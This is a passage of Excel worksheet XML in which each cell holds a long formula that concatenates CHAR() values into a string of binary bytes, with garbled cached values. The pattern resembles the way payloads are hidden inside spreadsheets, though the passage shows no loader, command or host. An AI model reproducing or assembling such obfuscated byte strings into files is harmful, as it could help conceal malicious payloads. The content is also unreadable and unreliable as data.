HAR(42)&amp;CHAR(5)&amp;CHAR(197)&amp;CHAR(9)&amp;CHAR(207)&amp;CHAR(136)&amp;CHAR(75)&amp;CHAR(38)&amp;CHAR(35)&amp;CHAR(136)&amp;CHAR(9)&amp;CHAR(190)&amp;CHAR(134)&amp;CHAR(199)&amp;CHAR(254)&amp;CHAR(139)&amp;CHAR(65)&amp;CHAR(41)&amp;CHAR(30)&amp;CHAR(130)&amp;CHAR(2)&amp;CHAR(84)&amp;CHAR(11)&amp;CHAR(202)&amp;CHAR(85)&amp;CHAR(227)&amp;CHAR(221)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(91)&amp;CHAR(80)&amp;CHAR(128)&amp;CHAR(195)&amp;CHAR(121)&amp;CHAR(23)&amp;CHAR(134)&amp;CHAR(65)&amp;CHAR(37)&amp;CHAR(30)&amp;CHAR(129)&amp;CHAR(235)&amp;CHAR(3)&amp;CHAR(131)&amp;CHAR(66)&amp;CHAR(37)&amp;CHAR(25)&amp;CHAR(138)&amp;CHAR(232)&amp;CHAR(4)&amp;CHAR(30)&amp;CHAR(134)&amp;CHAR(146)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(132)&amp;CHAR(145)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(226)&amp;CHAR(209)&amp;CHAR(136)&amp;CHAR(77)&amp;CHAR(33)&amp;CHAR(36)&amp;CHAR(128)&amp;CHAR(78)&amp;CHAR(32)&amp;CHAR(23)&amp;CHAR(9)&amp;CHAR(176)&amp;CHAR(67)&amp;CHAR(122)&amp;CHAR(240)&amp;CHAR(141)</f>
        <v>Ë‹M._x001A_0	qfˆN_x0001_éJ_x0006_²_x0005_€Ò!_x000B_ö_x0007__x0007_‹Z"_x0013_l:E#"v&amp;†Ä ø_x000D__x0002__x0005_„B-_x0012__x0005__x000B_‡	;_x0006_J%_x000F_‰M!_x0013__x000E__x0008_„	1N'_x0013_á_x0008_¹_x0001__x0019__x0007__x0005_w9Ò_x0006_‰#_x0008__x0002__x0005_Ä_x0007_‚A_x0007_
ÆG&amp;_x0010_0Îr­7_x0006_ˆÓtŸ4ËˆY)_x001E_†&lt;_x0001__x000D_€õ_x0006_	_x0002_‹›_x0008__x0003__x000B__x0005_`8_x0019__x000D_Ü_x0003__x000D__x000B_†JyƒË_x000C_ƒï_x0006__x0001__x0001_‚{4	‡ý_x0006_Žß	_x0002__x0005_‰A4_x0015__x0001_Å€A _x0017_‰@:&amp;ŒK3*_x0005_Å	ÏˆK&amp;#ˆ	¾†Çþ‹A)_x001E_‚_x0002_T_x000B_ÊUãÝ_x0005__x0001__x0013_[P€Ãy_x0017_†A%_x001E_ë_x0003_ƒB%_x0019_Šè_x0004__x001E_†’	
_x0006_„‘_x0001__x0004__x0005__x0005_âÑˆM!$€N _x0017_	°Czð</v>
      </c>
      <c r="C114" t="str">
        <f>CHAR(158)&amp;CHAR(67)&amp;CHAR(33)&amp;CHAR(192)&amp;CHAR(179)&amp;CHAR(68)&amp;CHAR(42)&amp;CHAR(148)&amp;CHAR(254)&amp;CHAR(200)</f>
        <v>žC!À³D*”þÈ</v>
      </c>
    </row>
    <row r="115" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B115" t="str">
        <f>CHAR(7)&amp;CHAR(139)&amp;CHAR(2)&amp;CHAR(199)&amp;CHAR(142)&amp;CHAR(70)&amp;CHAR(39)&amp;CHAR(37)&amp;CHAR(121)&amp;CHAR(118)&amp;CHAR(111)&amp;CHAR(71)&amp;CHAR(186)&amp;CHAR(2)&amp;CHAR(53)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(89)&amp;CHAR(106)&amp;CHAR(186)&amp;CHAR(8)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(56)&amp;CHAR(197)&amp;CHAR(86)&amp;CHAR(254)&amp;CHAR(70)&amp;CHAR(62)&amp;CHAR(130)&amp;CHAR(253)&amp;CHAR(134)&amp;CHAR(242)&amp;CHAR(127)&amp;CHAR(90)&amp;CHAR(109)&amp;CHAR(189)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(138)&amp;CHAR(78)&amp;CHAR(34)&amp;CHAR(53)&amp;CHAR(81)&amp;CHAR(94)&amp;CHAR(239)&amp;CHAR(205)&amp;CHAR(20)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(132)&amp;CHAR(137)&amp;CHAR(14)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(82)&amp;CHAR(250)&amp;CHAR(182)&amp;CHAR(13)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(250)&amp;CHAR(112)&amp;CHAR(47)&amp;CHAR(54)&amp;CHAR(251)&amp;CHAR(220)&amp;CHAR(110)&amp;CHAR(187)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(14)&amp;CHAR(53)&amp;CHAR(216)&amp;CHAR(89)&amp;CHAR(86)&amp;CHAR(233)&amp;CHAR(204)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(142)&amp;CHAR(194)&amp;CHAR(33)&amp;CHAR(111)&amp;CHAR(2)&amp;CHAR(194)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(85)&amp;CHAR(94)&amp;CHAR(253)&amp;CHAR(83)&amp;CHAR(72)&amp;CHAR(231)&amp;CHAR(18)&amp;CHAR(128)&amp;CHAR(66)&amp;CHAR(46)&amp;CHAR(80)&amp;CHAR(121)&amp;CHAR(3)&amp;CHAR(246)&amp;CHAR(113)&amp;CHAR(39)&amp;CHAR(57)&amp;CHAR(8)&amp;CHAR(203)&amp;CHAR(250)&amp;CHAR(209)&amp;CHAR(237)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(64)&amp;CHAR(34)&amp;CHAR(5)&amp;CHAR(199)&amp;CHAR(254)&amp;CHAR(217)&amp;CHAR(111)&amp;CHAR(5)&amp;CHAR(209)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(58)&amp;CHAR(202)&amp;CHAR(86)&amp;CHAR(95)&amp;CHAR(253)&amp;CHAR(80)&amp;CHAR(66)&amp;CHAR(91)&amp;CHAR(90)&amp;CHAR(84)&amp;CHAR(89)&amp;CHAR(130)&amp;CHAR(205)&amp;CHAR(217)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(199)&amp;CHAR(138)&amp;CHAR(234)&amp;CHAR(223)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(14)&amp;CHAR(85)&amp;CHAR(136)&amp;CHAR(150)&amp;CHAR(37)&amp;CHAR(225)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(80)&amp;CHAR(91)&amp;CHAR(81)&amp;CHAR(134)&amp;CHAR(188)&amp;CHAR(14)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(7)&amp;CHAR(132)&amp;CHAR(177)&amp;CHAR(78)&amp;CHAR(15)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(127)&amp;CHAR(7)&amp;CHAR(141)&amp;CHAR(55)&amp;CHAR(152)&amp;CHAR(129)&amp;CHAR(73)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(56)&amp;CHAR(242)&amp;CHAR(111)&amp;CHAR(5)&amp;CHAR(110)&amp;CHAR(2)&amp;CHAR(51)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(139)&amp;CHAR(5)&amp;CHAR(68)&amp;CHAR(11)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(82)&amp;CHAR(85)&amp;CHAR(246)&amp;CHAR(89)&amp;CHAR(58)&amp;CHAR(130)&amp;CHAR(234)&amp;CHAR(128)&amp;CHAR(239)&amp;CHAR(10)&amp;CHAR(129)&amp;CHAR(54)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(138)&amp;CHAR(27)&amp;CHAR(27)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(206)&amp;CHAR(86)&amp;CHAR(87)&amp;CHAR(100)&amp;CHAR(249)&amp;CHAR(142)&amp;CHAR(132)&amp;CHAR(25)&amp;CHAR(24)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(82)&amp;CHAR(82)&amp;CHAR(90)&amp;CHAR(249)&amp;CHAR(86)&amp;CHAR(87)&amp;CHAR(143)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(73)&amp;CHAR(143)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(30)&amp;CHAR(133)&amp;CHAR(72)&amp;CHAR(33)&amp;CHAR(19)&amp;CHAR(85)&amp;CHAR(85)&amp;CHAR(233)</f>
        <v>_x0007_‹_x0002_ÇŽF'%yvoGº_x0002_5_x000D__x0006_Yjº_x0008__x000C__x0005_8ÅVþF&gt;‚ý†òZm½_x0006__x0002__x0003_ŠN"5Q^ïÍ_x0014__x0002__x0002_„‰_x000E__x0001__x0002__x0005_Rú¶_x000D_
_x0003_	úp/6ûÜn»_x0007__x0002__x000E_5ØYVéÌ_x0007__x0003__x0005_ŽÂ!o_x0002_Â_x0005__x000D_U^ýSHç_x0012_€B.Py_x0003_öq'9_x0008_ËúÑí_x0005_ˆ@"_x0005_ÇþÙo_x0005_Ñ_x0002__x0002_:ÊV_ýPB[ZTY‚ÍÙ_x0004__x000B__x0002_ÇŠêß_x0007__x0002__x000E_Uˆ–%á_x0007__x0002__x0003_P[Q†¼_x000E__x0007__x0005__x000D__x0007_„±N_x000F__x000C__x0005__x0007_7˜I_x0002__x0003__x000D_8òo_x0005_n_x0002_3_x0007_
‹_x0005_D_x000B__x0007__x0005__x0011_RUöY:‚ê€ï
6_x0003__x0003_	ŽŠ_x001B__x001B__x0004__x000B__x0005_ÎVWdùŽ„_x0019__x0018__x0007__x0002_RRZùVWF!IM&amp;_x001E_…H!_x0013_UUé</v>
      </c>
      <c r="C115" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(179)&amp;CHAR(78)&amp;CHAR(252)&amp;CHAR(41)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(192)</f>
        <v>!¥³Nü)ÖÈ!À</v>
      </c>
    </row>
    <row r="116" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B116" t="str">
        <f>CHAR(95)&amp;CHAR(232)&amp;CHAR(246)&amp;CHAR(250)&amp;CHAR(142)&amp;CHAR(73)&amp;CHAR(47)&amp;CHAR(117)&amp;CHAR(140)&amp;CHAR(69)&amp;CHAR(34)&amp;CHAR(46)&amp;CHAR(142)&amp;CHAR(67)&amp;CHAR(46)&amp;CHAR(42)&amp;CHAR(81)&amp;CHAR(82)&amp;CHAR(225)&amp;CHAR(249)&amp;CHAR(247)&amp;CHAR(238)&amp;CHAR(253)&amp;CHAR(129)&amp;CHAR(205)&amp;CHAR(26)&amp;CHAR(143)&amp;CHAR(117)&amp;CHAR(38)&amp;CHAR(37)&amp;CHAR(85)&amp;CHAR(82)&amp;CHAR(250)&amp;CHAR(154)&amp;CHAR(170)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(129)&amp;CHAR(203)&amp;CHAR(13)&amp;CHAR(129)&amp;CHAR(195)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(143)&amp;CHAR(74)&amp;CHAR(34)&amp;CHAR(19)&amp;CHAR(90)&amp;CHAR(140)&amp;CHAR(130)&amp;CHAR(155)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(93)&amp;CHAR(108)&amp;CHAR(6)&amp;CHAR(80)&amp;CHAR(143)&amp;CHAR(129)&amp;CHAR(121)&amp;CHAR(9)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(82)&amp;CHAR(249)&amp;CHAR(155)&amp;CHAR(160)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(131)&amp;CHAR(193)&amp;CHAR(28)&amp;CHAR(135)&amp;CHAR(173)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(17)&amp;CHAR(139)&amp;CHAR(70)&amp;CHAR(39)&amp;CHAR(19)&amp;CHAR(90)&amp;CHAR(139)&amp;CHAR(130)&amp;CHAR(189)&amp;CHAR(13)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(65)&amp;CHAR(137)&amp;CHAR(19)&amp;CHAR(88)&amp;CHAR(245)&amp;CHAR(20)&amp;CHAR(140)&amp;CHAR(194)&amp;CHAR(112)&amp;CHAR(117)&amp;CHAR(142)&amp;CHAR(65)&amp;CHAR(45)&amp;CHAR(22)&amp;CHAR(83)&amp;CHAR(130)&amp;CHAR(13)&amp;CHAR(251)&amp;CHAR(90)&amp;CHAR(14)&amp;CHAR(129)&amp;CHAR(203)&amp;CHAR(115)&amp;CHAR(88)&amp;CHAR(140)&amp;CHAR(78)&amp;CHAR(42)&amp;CHAR(22)&amp;CHAR(142)&amp;CHAR(94)&amp;CHAR(37)&amp;CHAR(25)&amp;CHAR(142)&amp;CHAR(78)&amp;CHAR(39)&amp;CHAR(53)&amp;CHAR(95)&amp;CHAR(87)&amp;CHAR(142)&amp;CHAR(6)&amp;CHAR(253)&amp;CHAR(82)&amp;CHAR(9)&amp;CHAR(136)&amp;CHAR(198)&amp;CHAR(124)&amp;CHAR(74)&amp;CHAR(139)&amp;CHAR(139)&amp;CHAR(192)&amp;CHAR(6)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(86)&amp;CHAR(254)&amp;CHAR(64)&amp;CHAR(114)&amp;CHAR(130)&amp;CHAR(73)&amp;CHAR(39)&amp;CHAR(29)&amp;CHAR(128)&amp;CHAR(245)&amp;CHAR(111)&amp;CHAR(3)&amp;CHAR(81)&amp;CHAR(83)&amp;CHAR(136)&amp;CHAR(22)&amp;CHAR(245)&amp;CHAR(84)&amp;CHAR(33)&amp;CHAR(86)&amp;CHAR(130)&amp;CHAR(247)&amp;CHAR(250)&amp;CHAR(66)&amp;CHAR(118)&amp;CHAR(49)&amp;CHAR(246)&amp;CHAR(143)&amp;CHAR(240)&amp;CHAR(124)&amp;CHAR(33)&amp;CHAR(142)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(17)&amp;CHAR(94)&amp;CHAR(85)&amp;CHAR(84)&amp;CHAR(130)&amp;CHAR(13)&amp;CHAR(83)&amp;CHAR(92)&amp;CHAR(85)&amp;CHAR(83)&amp;CHAR(92)&amp;CHAR(83)&amp;CHAR(87)&amp;CHAR(248)&amp;CHAR(83)&amp;CHAR(26)&amp;CHAR(131)&amp;CHAR(195)&amp;CHAR(127)&amp;CHAR(13)&amp;CHAR(138)&amp;CHAR(67)&amp;CHAR(38)&amp;CHAR(19)&amp;CHAR(111)&amp;CHAR(15)&amp;CHAR(86)&amp;CHAR(142)&amp;CHAR(15)&amp;CHAR(253)&amp;CHAR(83)&amp;CHAR(17)&amp;CHAR(134)&amp;CHAR(66)&amp;CHAR(45)&amp;CHAR(22)&amp;CHAR(86)&amp;CHAR(131)&amp;CHAR(4)&amp;CHAR(250)&amp;CHAR(90)&amp;CHAR(13)&amp;CHAR(141)&amp;CHAR(69)&amp;CHAR(55)&amp;CHAR(18)&amp;CHAR(89)&amp;CHAR(142)&amp;CHAR(11)&amp;CHAR(242)&amp;CHAR(90)&amp;CHAR(17)&amp;CHAR(142)&amp;CHAR(69)&amp;CHAR(34)&amp;CHAR(18)&amp;CHAR(83)&amp;CHAR(140)&amp;CHAR(2)&amp;CHAR(249)&amp;CHAR(80)&amp;CHAR(9)&amp;CHAR(130)&amp;CHAR(132)&amp;CHAR(69)&amp;CHAR(22)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(132)&amp;CHAR(14)&amp;CHAR(67)</f>
        <v>_èöúŽI/uŒE".ŽC.*QRáù÷îýÍ_x001A_u&amp;%URúšª_x0003_	_x0005_Ë_x000D_Ã_x0006__x0007__x0007_J"_x0013_ZŒ‚›_x0006__x0003__x0005_]l_x0006_Py	_x0006_	Rù› _x0005__x000B__x0005_ƒÁ_x001C_‡­_x0005__x0003__x000D_€A!_x0011_‹F'_x0013_Z‹‚½_x000D__x0007__x0005_A‰_x0013_Xõ_x0014_ŒÂpuŽA-_x0016_S‚_x000D_ûZ_x000E_ËsXŒN*_x0016_Ž^%_x0019_ŽN'5_WŽ_x0006_ýR	ˆÆ|J‹‹À_x0006__x000B__x0005_Vþ@r‚I'_x001D_€õo_x0003_QSˆ_x0016_õT!V‚÷úBv1öð|!ŽF!_x0011_^UT‚_x000D_S\US\SWøS_x001A_ƒÃ_x000D_ŠC&amp;_x0013_o_x000F_VŽ_x000F_ýS_x0011_†B-_x0016_Vƒ_x0004_úZ_x000D_E7_x0012_YŽ_x000B_òZ_x0011_ŽE"_x0012_SŒ_x0002_ùP	‚„E_x0016__x0002__x0002_„_x000E_C</v>
      </c>
      <c r="C116" t="str">
        <f>CHAR(179)&amp;CHAR(68)&amp;CHAR(50)&amp;CHAR(148)&amp;CHAR(254)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(179)&amp;CHAR(78)</f>
        <v>³D2”þÈ!¥³N</v>
      </c>
    </row>
    <row r="117" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B117" t="str">
        <f>CHAR(11)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(85)&amp;CHAR(82)&amp;CHAR(92)&amp;CHAR(234)&amp;CHAR(22)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(136)&amp;CHAR(198)&amp;CHAR(8)&amp;CHAR(99)&amp;CHAR(6)&amp;CHAR(199)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(89)&amp;CHAR(83)&amp;CHAR(252)&amp;CHAR(89)&amp;CHAR(65)&amp;CHAR(94)&amp;CHAR(89)&amp;CHAR(95)&amp;CHAR(88)&amp;CHAR(132)&amp;CHAR(201)&amp;CHAR(222)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(193)&amp;CHAR(134)&amp;CHAR(225)&amp;CHAR(10)&amp;CHAR(90)&amp;CHAR(87)&amp;CHAR(80)&amp;CHAR(131)&amp;CHAR(120)&amp;CHAR(33)&amp;CHAR(23)&amp;CHAR(82)&amp;CHAR(133)&amp;CHAR(191)&amp;CHAR(31)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(128)&amp;CHAR(181)&amp;CHAR(69)&amp;CHAR(2)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(118)&amp;CHAR(1)&amp;CHAR(140)&amp;CHAR(53)&amp;CHAR(141)&amp;CHAR(135)&amp;CHAR(65)&amp;CHAR(14)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(34)&amp;CHAR(239)&amp;CHAR(104)&amp;CHAR(13)&amp;CHAR(98)&amp;CHAR(6)&amp;CHAR(57)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(143)&amp;CHAR(1)&amp;CHAR(64)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(85)&amp;CHAR(81)&amp;CHAR(244)&amp;CHAR(84)&amp;CHAR(56)&amp;CHAR(128)&amp;CHAR(222)&amp;CHAR(130)&amp;CHAR(220)&amp;CHAR(13)&amp;CHAR(138)&amp;CHAR(215)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(138)&amp;CHAR(136)&amp;CHAR(18)&amp;CHAR(26)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(204)&amp;CHAR(86)&amp;CHAR(81)&amp;CHAR(104)&amp;CHAR(250)&amp;CHAR(128)&amp;CHAR(137)&amp;CHAR(17)&amp;CHAR(27)&amp;CHAR(6)&amp;CHAR(8)&amp;CHAR(93)&amp;CHAR(80)&amp;CHAR(94)&amp;CHAR(250)&amp;CHAR(80)&amp;CHAR(81)&amp;CHAR(70)&amp;CHAR(87)&amp;CHAR(246)&amp;CHAR(147)&amp;CHAR(171)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(193)&amp;CHAR(9)&amp;CHAR(135)&amp;CHAR(132)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(140)&amp;CHAR(69)&amp;CHAR(45)&amp;CHAR(23)&amp;CHAR(85)&amp;CHAR(156)&amp;CHAR(132)&amp;CHAR(238)&amp;CHAR(13)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(89)&amp;CHAR(104)&amp;CHAR(4)&amp;CHAR(87)&amp;CHAR(136)&amp;CHAR(131)&amp;CHAR(213)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(85)&amp;CHAR(251)&amp;CHAR(157)&amp;CHAR(174)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(130)&amp;CHAR(199)&amp;CHAR(119)&amp;CHAR(111)&amp;CHAR(141)&amp;CHAR(71)&amp;CHAR(46)&amp;CHAR(17)&amp;CHAR(140)&amp;CHAR(83)&amp;CHAR(38)&amp;CHAR(35)&amp;CHAR(87)&amp;CHAR(94)&amp;CHAR(86)&amp;CHAR(142)&amp;CHAR(15)&amp;CHAR(253)&amp;CHAR(147)&amp;CHAR(1)&amp;CHAR(12)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(135)&amp;CHAR(198)&amp;CHAR(125)&amp;CHAR(76)&amp;CHAR(99)&amp;CHAR(50)&amp;CHAR(105)&amp;CHAR(34)&amp;CHAR(33)&amp;CHAR(103)&amp;CHAR(59)&amp;CHAR(130)&amp;CHAR(73)&amp;CHAR(39)&amp;CHAR(29)&amp;CHAR(134)&amp;CHAR(73)&amp;CHAR(33)&amp;CHAR(21)&amp;CHAR(86)&amp;CHAR(143)&amp;CHAR(133)&amp;CHAR(251)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(81)&amp;CHAR(130)&amp;CHAR(22)&amp;CHAR(84)&amp;CHAR(238)&amp;CHAR(16)&amp;CHAR(135)&amp;CHAR(201)&amp;CHAR(127)&amp;CHAR(38)&amp;CHAR(130)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(18)&amp;CHAR(136)&amp;CHAR(81)&amp;CHAR(45)&amp;CHAR(26)&amp;CHAR(81)&amp;CHAR(246)&amp;CHAR(113)&amp;CHAR(32)&amp;CHAR(19)&amp;CHAR(137)&amp;CHAR(12)&amp;CHAR(91)&amp;CHAR(249)&amp;CHAR(150)&amp;CHAR(139)&amp;CHAR(2)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(136)&amp;CHAR(78)&amp;CHAR(37)&amp;CHAR(21)&amp;CHAR(87)</f>
        <v>_x000B__x0002__x0005__x0002_UR\ê_x0016__x000D__x0005__x0004_ˆÆ_x0008_c_x0006_Ç_x0007__x0002_YSüYA^Y_X„ÉÞ_x0005__x0007__x0002_Á†á
ZWPƒx!_x0017_R…¿_x001F__x0007_	_x0005__x0002_€µE_x0002__x0001__x0006_v_x0001_Œ5‡A_x000E__x0007__x0005_"ïh_x000D_b_x0006_9_x0002__x0005__x0001_@_x000B__x0002__x0003_	UQôT8€Þ‚Ü_x000D_Š×_x0003_
_x0001_Šˆ_x0012__x001A__x0005__x000D__x0005_ÌVQhú€‰_x0011__x001B__x0006__x0008_]P^úPQFWö“«_x000D__x000B__x000D_€Á	‡„_x0007_
_x0006_ŒE-_x0017_Uœ„î_x000D_
_x0006_Yh_x0004_WˆƒÕ_x0006__x0003_	Uû®_x0004__x000B__x0006_‚ÇwoG._x0011_ŒS&amp;#W^VŽ_x000F_ý“_x0001__x000C__x0006_	‡Æ}Lc2i"!g;‚I'_x001D_†I!_x0015_V…û_x000E__x0006__x0001_Q‚_x0016_Tî_x0010_‡É&amp;‚F!_x0012_ˆQ-_x001A_Qöq _x0013_‰_x000C_[ù–‹_x0002__x000E__x0006_ˆN%_x0015_W</v>
      </c>
      <c r="C117" t="str">
        <f>CHAR(255)&amp;CHAR(33)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(237)&amp;CHAR(112)&amp;CHAR(198)&amp;CHAR(193)&amp;CHAR(33)</f>
        <v>ÿ!ÖÈ!ípÆÁ!</v>
      </c>
    </row>
    <row r="118" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B118" t="str">
        <f>CHAR(137)&amp;CHAR(11)&amp;CHAR(250)&amp;CHAR(92)&amp;CHAR(14)&amp;CHAR(142)&amp;CHAR(67)&amp;CHAR(38)&amp;CHAR(18)&amp;CHAR(85)&amp;CHAR(134)&amp;CHAR(14)&amp;CHAR(246)&amp;CHAR(83)&amp;CHAR(14)&amp;CHAR(247)&amp;CHAR(154)&amp;CHAR(181)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(138)&amp;CHAR(149)&amp;CHAR(66)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(128)&amp;CHAR(15)&amp;CHAR(72)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(83)&amp;CHAR(82)&amp;CHAR(89)&amp;CHAR(238)&amp;CHAR(249)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(134)&amp;CHAR(213)&amp;CHAR(14)&amp;CHAR(106)&amp;CHAR(9)&amp;CHAR(202)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(87)&amp;CHAR(86)&amp;CHAR(253)&amp;CHAR(83)&amp;CHAR(69)&amp;CHAR(86)&amp;CHAR(92)&amp;CHAR(94)&amp;CHAR(82)&amp;CHAR(134)&amp;CHAR(192)&amp;CHAR(7)&amp;CHAR(193)&amp;CHAR(143)&amp;CHAR(79)&amp;CHAR(34)&amp;CHAR(11)&amp;CHAR(192)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(50)&amp;CHAR(193)&amp;CHAR(197)&amp;CHAR(18)&amp;CHAR(3)&amp;CHAR(142)&amp;CHAR(73)&amp;CHAR(34)&amp;CHAR(1)&amp;CHAR(44)&amp;CHAR(70)&amp;CHAR(38)&amp;CHAR(13)&amp;CHAR(206)&amp;CHAR(141)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(2)&amp;CHAR(145)&amp;CHAR(251)&amp;CHAR(121)&amp;CHAR(47)&amp;CHAR(13)&amp;CHAR(197)&amp;CHAR(233)&amp;CHAR(19)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(91)&amp;CHAR(142)&amp;CHAR(227)&amp;CHAR(8)&amp;CHAR(198)&amp;CHAR(84)&amp;CHAR(141)&amp;CHAR(238)&amp;CHAR(103)&amp;CHAR(166)&amp;CHAR(58)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(58)&amp;CHAR(206)&amp;CHAR(83)&amp;CHAR(154)&amp;CHAR(66)&amp;CHAR(14)&amp;CHAR(130)&amp;CHAR(122)&amp;CHAR(10)&amp;CHAR(226)&amp;CHAR(34)&amp;CHAR(128)&amp;CHAR(203)&amp;CHAR(112)&amp;CHAR(38)&amp;CHAR(246)&amp;CHAR(119)&amp;CHAR(27)&amp;CHAR(246)&amp;CHAR(112)&amp;CHAR(16)&amp;CHAR(244)&amp;CHAR(119)&amp;CHAR(20)&amp;CHAR(244)&amp;CHAR(115)&amp;CHAR(11)&amp;CHAR(87)&amp;CHAR(253)&amp;CHAR(123)&amp;CHAR(14)&amp;CHAR(235)&amp;CHAR(134)&amp;CHAR(236)&amp;CHAR(254)&amp;CHAR(248)&amp;CHAR(137)&amp;CHAR(53)&amp;CHAR(134)&amp;CHAR(201)&amp;CHAR(30)&amp;CHAR(142)&amp;CHAR(207)&amp;CHAR(137)&amp;CHAR(68)&amp;CHAR(29)&amp;CHAR(136)&amp;CHAR(198)&amp;CHAR(124)&amp;CHAR(219)&amp;CHAR(141)&amp;CHAR(201)&amp;CHAR(82)&amp;CHAR(88)&amp;CHAR(200)&amp;CHAR(142)&amp;CHAR(66)&amp;CHAR(37)&amp;CHAR(27)&amp;CHAR(84)&amp;CHAR(130)&amp;CHAR(113)&amp;CHAR(39)&amp;CHAR(5)&amp;CHAR(129)&amp;CHAR(27)&amp;CHAR(129)&amp;CHAR(211)&amp;CHAR(114)&amp;CHAR(22)&amp;CHAR(137)&amp;CHAR(205)&amp;CHAR(33)&amp;CHAR(246)&amp;CHAR(139)&amp;CHAR(208)&amp;CHAR(51)&amp;CHAR(15)&amp;CHAR(112)&amp;CHAR(27)&amp;CHAR(66)&amp;CHAR(136)&amp;CHAR(5)&amp;CHAR(12)&amp;CHAR(140)&amp;CHAR(216)&amp;CHAR(134)&amp;CHAR(204)&amp;CHAR(119)&amp;CHAR(245)&amp;CHAR(10)&amp;CHAR(191)&amp;CHAR(10)&amp;CHAR(12)&amp;CHAR(191)&amp;CHAR(199)&amp;CHAR(47)&amp;CHAR(202)&amp;CHAR(92)&amp;CHAR(199)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(19)&amp;CHAR(84)&amp;CHAR(137)&amp;CHAR(82)&amp;CHAR(34)&amp;CHAR(35)&amp;CHAR(57)&amp;CHAR(193